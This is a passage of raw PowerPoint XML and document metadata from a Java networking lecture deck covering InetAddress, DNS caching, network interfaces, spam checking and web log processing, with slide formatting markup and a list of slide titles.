                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="华文行楷" panose="02010800040101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="华文行楷" panose="02010800040101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Rectangle 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2362200" y="2129909"/>
            <a:ext cx="7924800" cy="1477328"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" marR="0" lvl="0" indent="-342900">
              <a:lnSpc>
                <a:spcPts val="2145"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"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Understand DNS/IP interactions in Java.</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Font typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"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Write secure, performant network code.</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Font typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"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Develop tools for real-world scenarios (logging, spam detection).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="1" dirty="0">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nSpc>
                <a:spcPts val="2145"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="404040"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Troubleshoot common networking issues.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="1"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5" name="Rectangle 6"/>
          <p:cNvSpPr>
            <a:spLocks noRot="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="304800" y="466428"/>
            <a:ext cx="45021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r>
              <a:rPr lang="en-US" altLang="en-US" sz="8000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="华文行楷" panose="02010800040101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="华文行楷" panose="02010800040101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Summary</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="8000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="华文行楷" panose="02010800040101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="华文行楷" panose="02010800040101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/theme/theme1.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60007</Words>
  <Application>WPS 演示</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>1961</Paragraphs>
  <Slides>107</Slides>
  <Notes>3</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107</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="125" baseType="lpstr">
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>宋体</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>Wingdings 2</vt:lpstr>
      <vt:lpstr>华文行楷</vt:lpstr>
      <vt:lpstr>微软雅黑</vt:lpstr>
      <vt:lpstr>Arial Unicode MS</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Consolas</vt:lpstr>
      <vt:lpstr>Arial Unicode MS</vt:lpstr>
      <vt:lpstr>Menlo</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Times New Roman</vt:lpstr>
      <vt:lpstr>Symbol</vt:lpstr>
      <vt:lpstr>Courier New</vt:lpstr>
      <vt:lpstr>Segoe UI</vt:lpstr>
      <vt:lpstr>Segoe Print</vt:lpstr>
      <vt:lpstr>砖雕艺术</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>Objective of this Chapter:</vt:lpstr>
      <vt:lpstr>Course Content</vt:lpstr>
      <vt:lpstr>1. Internet Address Concepts</vt:lpstr>
      <vt:lpstr>Internet Address ( IP Address)</vt:lpstr>
      <vt:lpstr>IPV4 and IPV6 Mixed Mode Network</vt:lpstr>
      <vt:lpstr>2. DNS and IP Relationship</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>3. InetAddress Class and Application Programming</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>1. getByName Method: Get IP Address from Hostname</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>getByName method usage example</vt:lpstr>
      <vt:lpstr>getByName method usage example</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>getAllByName method usage example</vt:lpstr>
      <vt:lpstr>getAllByName method usage example</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>getLocalHost method usage example</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>getByAddress method usage example</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>4. InetAddress Security Issues</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>Why not allow access to the website directly via IP?</vt:lpstr>
      <vt:lpstr>Why not allow access to the website directly via IP?</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>5. DNS Cache Programming</vt:lpstr>
      <vt:lpstr>DNS Cache</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>DNS Performance and Caching in Java</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>Modify DNS cache programming example</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>6. Hostname/Domain Acquisition Methods</vt:lpstr>
      <vt:lpstr>Getter Methods</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>using getCanonicalHostName method</vt:lpstr>
      <vt:lpstr>using getCanonicalHostName method</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>Use the getHostAddress method to obtain the IP address</vt:lpstr>
      <vt:lpstr>Use the getAddress method to obtain the IP address</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>How to obtain</vt:lpstr>
      <vt:lpstr>7. Testing IP Address Properties</vt:lpstr>
      <vt:lpstr>Inet4Address/Inet6Address</vt:lpstr>
      <vt:lpstr>Testing the nature of an IP address</vt:lpstr>
      <vt:lpstr>Testing the nature of an IP address</vt:lpstr>
      <vt:lpstr>Testing the nature of an IP address</vt:lpstr>
      <vt:lpstr>8. NetworkInterface Class</vt:lpstr>
      <vt:lpstr>NetworkInterface</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>Example: List the network interfaces on this machine</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>Example: List the network interfaces on this machine</vt:lpstr>
      <vt:lpstr>Experiment: Identifying Local IP Addresses in a Campus Network</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>9. Spam Detection (SpamCheck)</vt:lpstr>
      <vt:lpstr>Application of InetAddress : SpamCheck</vt:lpstr>
      <vt:lpstr>SpamCheck Implementation Using InetAddress</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>Application of InetAddress : SpamCheck</vt:lpstr>
      <vt:lpstr>Application of InetAddress : Offline processing of log files</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>10. Offline Log Processing</vt:lpstr>
      <vt:lpstr>Web Server log files</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>Programming Thinking 1</vt:lpstr>
      <vt:lpstr>Programming Thinking 2</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Basker George</dc:creator>
  <cp:lastModifiedBy>杨韩冰</cp:lastModifiedBy>
  <cp:revision>1404</cp:revision>
  <cp:lastPrinted>2018-04-23T08:05:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2113-01-01T00:00:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-05-14T15:53:28Z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3010AE226DBE478494812F417CFF8230_12</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="4" name="KSOProductBuildVer">
    <vt:lpwstr>2052-12.1.0.20305</vt:lpwstr>
  </property>
</Properties>
</file>